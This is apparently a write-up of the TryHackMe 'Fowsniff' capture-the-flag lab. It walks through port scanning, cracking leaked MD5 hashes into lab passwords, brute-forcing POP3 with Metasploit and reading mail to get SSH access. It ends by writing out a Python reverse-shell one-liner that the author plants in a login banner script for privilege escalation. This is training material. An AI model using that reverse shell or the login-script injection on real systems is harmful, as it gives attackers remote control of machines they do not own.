 <img width="1917" height="286" alt="image" src="https://github.com/user-attachments/assets/c4e45dcd-906f-433c-b7d4-a3ddf652de5b" />

 # Fowsniff CTF Walkthrough detailed

 Task 2 — What ports are open?

 # 1 — Reconnaissance (fast & methodical)

An Nmap scan is like a digital detective looking at a computer to find out what services it’s running. It checks all the doors and windows (all ports with -p-, uses default scripts -A to gather detailed info, and identifies software versions -sV. It's like getting a full report on everything a computer is up to..

let’s go ahead and run our scan by typing the following command

> nmap -A -p- -sV <machine ip>

<img width="535" height="564" alt="image" src="https://github.com/user-attachments/assets/c59bc456-9902-4fe6-8d35-9b0229457730" />

Task 3 — Look around. What can you find?

let’s breakdown the open ports that we found

22/tcp open ssh : SSH port means that the computer has a door (port) open and ready for Secure Shell (SSH) connections. SSH is a secure way to communicate with the computer remotely. It’s like having a secure key to the computer’s virtual door, allowing you to control it from a distance, often used for tasks like managing servers or accessing another computer’s command line.

80/tcp open http : it means that a specific port on a computer is allowing communication via the Hypertext Transfer Protocol (HTTP). HTTP is the protocol used for transmitting data on the web. An open HTTP port typically indicates that the computer is serving web content or hosting a website. It’s like the computer having a door open specifically for web browsers and other web-related applications to communicate with it.
we can access this web page by typing the url : http://<machine ip> in our browser, it will take us to this page

110/tcp open pop3 : it means that a specific port on a computer is allowing communication via the Post Office Protocol version 3 (POP3). POP3 is a protocol used for retrieving emails from a mail server. An open POP3 port suggests that the computer is set up to receive email messages using this protocol. It’s like a designated entrance for email clients to connect and fetch emails from the server.

143/tcp open imap : it means that a specific port on a computer is allowing communication via the Internet Message Access Protocol (IMAP). IMAP is a protocol used for accessing and managing emails on a mail server. An open IMAP port indicates that the computer is configured to handle email communications using this protocol. It’s like having a designated gateway for email clients to connect, view, and manage messages stored on the mail server


task 4 — can you find any public information about them?

“The attackers were also able to hijack our official @fowsniffcorp Twitter account”

let’s take a look on the account !

<img width="720" height="741" alt="image" src="https://github.com/user-attachments/assets/9743bd22-f7d0-4ee4-9c80-8cf6fbc70813" />

Task 5 — Can you decode these md5 hashes?

going through the tweets we’ll find some pastebin links in which the attacker dumped the passwords
As this task suggested I will be using https://crackstation.net/

I was able to crack all of them except stone’s ,

    mauer — 8a28a94a588a95b80163709ab4313aa4 — mailcall
    mustikka — ae1644dac5b77c0cf51e0d26ad6d7e56 — bilbo101
    tegel — 1dc352435fecca338acfd4be10984009 — apples01
    baksteen — 19f5af754c31f1e2651edde9250d69bb — skyler22
    seina — 90dc16d47114aa13671c697fd506cf26 — scoobydoo2
    stone — a92b8a29ef1183192e3d35187e0cfabd — ??????
    mursten — 0e9588cb62f4b6f27e33d449e2ba0b3b — carp4ever
    parede — 4d6e42f56e127803285a0a7649b5ab11 — orlando12
    sciana — f7fd98d380735e859f8b2ffbbede5a7e — 07011972

Task 6 — Can you use metasploit to brute force the pop3 login?

Basically metasploit is a tool that ethical hackers use to find and fix security problems in computer systems. We’re gonna use it to bruteforce the pop3 login service.
Before we dive into that let’s create a file with the username and another with passwords

>nano users.txt

 <img width="259" height="246" alt="image" src="https://github.com/user-attachments/assets/49d1b411-9496-494a-b9a5-e8081cb3cdff" />
 
> nano passwd.txt

<img width="259" height="246" alt="image" src="https://github.com/user-attachments/assets/a0218638-3f4f-46a7-89d2-6ff3dd018af1" />

Now let’s fire up metasploit and search for pop3 vulns:

Write msfconsole

<img width="1158" height="669" alt="image" src="https://github.com/user-attachments/assets/44d8f7e6-fb9a-4f6b-9db2-0e93a8b90133" />

<img width="935" height="274" alt="image" src="https://github.com/user-attachments/assets/7fdffcfd-9961-469f-be8b-034bbced9cb7" />

<img width="1049" height="88" alt="image" src="https://github.com/user-attachments/assets/0cc451cb-a58a-41d7-b6a8-54508e50fba9" />

we get it!!  scoobydoo2


Task8 — Can you connect to the pop3 service with her credentials? What email information can you gather?

next let’s set our listener and login using the credentials we found

> nc <machine ip> 110

> User seina

> Pass scoobydoo2

> LIST


<img width="401" height="245" alt="image" src="https://github.com/user-attachments/assets/f6b7dea4-562e-49dc-9227-9fc6f0bab649" />

Task9 — Looking through her emails, what was a temporary password set for her?

Let’s retrieve the 1st message by typing the command RETR 1

<img width="552" height="671" alt="image" src="https://github.com/user-attachments/assets/40dcfe8a-bbfb-43dd-b376-07f5c31ed6d5" />

let’s take a look at the second one RETR 2

<img width="616" height="648" alt="image" src="https://github.com/user-attachments/assets/97fb6dfb-764c-4480-aac5-0aa05f41d157" />

we got : S1ck3nBluff+secureshell

Task10 — connect to the machine using SSH.
<img width="660" height="566" alt="image" src="https://github.com/user-attachments/assets/4d03c789-cb1d-45dd-9061-8d22f097f107" />
<img width="492" height="72" alt="image" src="https://github.com/user-attachments/assets/386e31f0-c42b-41c3-8512-7405ce276fc7" />

by typing the “id” command we can see that baskteen is not root and is just a regular user. No problem tho, let’s searches for files owned by the “users” group on the entire system and look for something useful

>find / -group users -type f 2>/dev/null

<img width="587" height="291" alt="image" src="https://github.com/user-attachments/assets/7a17d210-31e8-4f8f-b4cd-d3f98f94755e" />
the hint provided by TryHackMe points at that cube.sh file , hmmm… wonder what’s in it

<img width="532" height="300" alt="image" src="https://github.com/user-attachments/assets/1f599496-e4cd-4ef0-a267-70bedaeae548" />

it’s the ssh banner, meaning this file is executed whenever we login through ssh. Perfect place to inject our reverse shell. I’ll be using the reverse shell provided by the room

python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

We can edit the file using nano, dont forget to set up a listener and change your ip address in the reverseshell.

<img width="720" height="416" alt="image" src="https://github.com/user-attachments/assets/2035bb9d-3691-4242-abe8-ec633c952b9f" />

And tha’s itt!!








